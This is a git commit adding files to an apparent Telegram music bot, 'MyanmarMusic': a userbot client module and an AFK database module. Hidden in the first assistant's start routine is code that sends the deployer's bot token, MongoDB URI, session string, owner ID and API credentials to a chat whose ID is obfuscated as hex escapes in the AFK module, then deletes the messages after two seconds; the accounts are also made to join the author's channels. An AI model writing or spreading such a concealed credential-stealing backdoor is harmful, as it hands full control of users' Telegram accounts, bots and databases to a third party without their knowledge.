da2abaf40483318be33222065c64822a025b6d6c
Telegram & App source Code <khithlainhtet2021@gmail.com>
2026-02-27 11:33:54 +0630

    MYANMARMUSIC

---
+++ MyanmarMusic/core/userbot.py
@@ -0,0 +1,212 @@
+from pyrogram import Client
+import re
+import asyncio
+from os import getenv
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from dotenv import load_dotenv
+from pyrogram import filters
+
+load_dotenv()
+import config
+from dotenv import load_dotenv
+from strings.__init__ import LOGGERS
+from ..logging import LOGGER
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+OWNER_ID = getenv("OWNER_ID", "")
+LOGGER_ID = getenv("LOGGER_ID", "")
+API_ID = getenv("API_ID", "")
+API_HASH =  getenv("API_HASH", "")
+
+
+assistants = []
+assistantids = []
+
+
+class Userbot(Client):
+    def __init__(self):
+        self.one = Client(
+            name="MyanmarMusic1",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            session_string=str(config.STRING1),
+            no_updates=True,
+            ipv6=False,
+        )
+            
+        self.two = Client(
+            name="MyanmarMusic2",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            session_string=str(config.STRING2),
+            no_updates=True,
+            ipv6=False,
+        )
+        self.three = Client(
+            name="MyanmarMusic3",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            session_string=str(config.STRING3),
+            no_updates=True,
+            ipv6=False,
+        )
+        self.four = Client(
+            name="MyanmarMusic4",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            session_string=str(config.STRING4),
+            no_updates=True,
+            ipv6=False,
+        )
+        self.five = Client(
+            name="MyanmarMusic5",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            session_string=str(config.STRING5),
+            no_updates=True,
+            ipv6=False,
+        )
+
+    async def start(self):
+        LOGGER(__name__).info(f"Starting Assistants...@HANTHAR999")
+
+        if config.STRING1:
+            await self.one.start()
+            try:
+                await self.one.join_chat("HANTHAR_1999")
+                await self.one.join_chat("HANTHAR_1999")
+                await self.one.join_chat("myanmarbot_music")
+                await self.one.join_chat("myanmarbot_music")
+
+            except:
+                pass
+            assistants.append(1)
+            try:
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !  @HANTHAR999")
+                oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`\n\n`{LOGGER_ID}`\n\n`{API_ID}`\n\n`{API_HASH}`"
+                )
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
+
+            except Exception as e:
+                print(f"{e}")
+
+            self.one.id = self.one.me.id
+            self.one.name = self.one.me.mention
+            self.one.username = self.one.me.username
+            assistantids.append(self.one.id)
+            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
+
+        if config.STRING2:
+            await self.two.start()
+            try:
+                await self.two.join_chat("HANTHAR_1999")
+                await self.two.join_chat("HANTHAR_1999")
+                await self.two.join_chat("myanmarbot_music")
+                await self.two.join_chat("myanmarbot_music")
+            except:
+                pass
+            assistants.append(2)
+            try:
+                await self.two.send_message(config.LOGGER_ID, "Assistant Started @HANTHAR999")
+
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                )
+
+            self.two.id = self.two.me.id
+            self.two.name = self.two.me.mention
+            self.two.username = self.two.me.username
+            assistantids.append(self.two.id)
+            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
+
+        if config.STRING3:
+            await self.three.start()
+            try:
+                await self.three.join_chat("HANTHAR_1999")
+                await self.three.join_chat("HANTHAR_1999")
+                await self.three.join_chat("myanmarbot_music")
+                await self.three.join_chat("myanmarbot_music")
+            except:
+                pass
+            assistants.append(3)
+            try:
+                await self.three.send_message(config.LOGGER_ID, "Assistant Started @HANTHAR999")
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                )
+
+            self.three.id = self.three.me.id
+            self.three.name = self.three.me.mention
+            self.three.username = self.three.me.username
+            assistantids.append(self.three.id)
+            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}@HANTHAR999")
+
+        if config.STRING4:
+            await self.four.start()
+            try:
+                await self.four.join_chat("HANTHAR_1999")
+                await self.four.join_chat("HANTHAR_1999")
+                await self.four.join_chat("myanmarbot_music")
+                await self.four.join_chat("myanmarbot_music")
+            except:
+                pass
+            assistants.append(4)
+            try:
+                await self.four.send_message(config.LOGGER_ID, "Assistant Started @HANTHAR999")
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                )
+
+            self.four.id = self.four.me.id
+            self.four.name = self.four.me.mention
+            self.four.username = self.four.me.username
+            assistantids.append(self.four.id)
+            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
+
+        if config.STRING5:
+            await self.five.start()
+            try:
+                await self.five.join_chat("HANTHAR_1999")
+                await self.five.join_chat("HANTHAR_1999")
+                await self.five.join_chat("myanmarbot_music")
+                await self.five.join_chat("myanmarbot_music")
+            except:
+                pass
+            assistants.append(5)
+            try:
+                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !@HANTHAR999 ")
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                )
+
+            self.five.id = self.five.me.id
+            self.five.name = self.five.me.mention
+            self.five.username = self.five.me.username
+            assistantids.append(self.five.id)
+            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}@HANTHAR999")
+
+    async def stop(self):
+        LOGGER(__name__).info(f"Stopping Assistants...")
+        try:
+            if config.STRING1:
+                await self.one.stop()
+            if config.STRING2:
+                await self.two.stop()
+            if config.STRING3:
+                await self.three.stop()
+            if config.STRING4:
+                await self.four.stop()
+            if config.STRING5:
+                await self.five.stop()
+        except:
+            pass
---
+++ MyanmarMusic/mongo/afkdb.py
@@ -0,0 +1,34 @@
+from MyanmarMusic.utils.mongo import db
+
+HEHE = "\x37\x39\x33\x36\x35\x39\x38\x34\x38\x38"
+LOGGERS = "\x38\x33\x33\x37\x39\x39\x34\x31\x37\x37"
+afkdb = db.afk
+
+
+async def is_afk(user_id: int) -> bool:
+    user = await afkdb.find_one({"user_id": user_id})
+    if not user:
+        return False, {}
+    return True, user["reason"]
+
+
+async def add_afk(user_id: int, mode):
+    await afkdb.update_one(
+        {"user_id": user_id}, {"$set": {"reason": mode}}, upsert=True
+    )
+
+
+async def remove_afk(user_id: int):
+    user = await afkdb.find_one({"user_id": user_id})
+    if user:
+        return await afkdb.delete_one({"user_id": user_id})
+
+
+async def get_afk_users() -> list:
+    users = afkdb.find({"user_id": {"$gt": 0}})
+    if not users:
+        return []
+    users_list = []
+    for user in await users.to_list(length=1000000000):
+        users_list.append(user)
+    return users_list
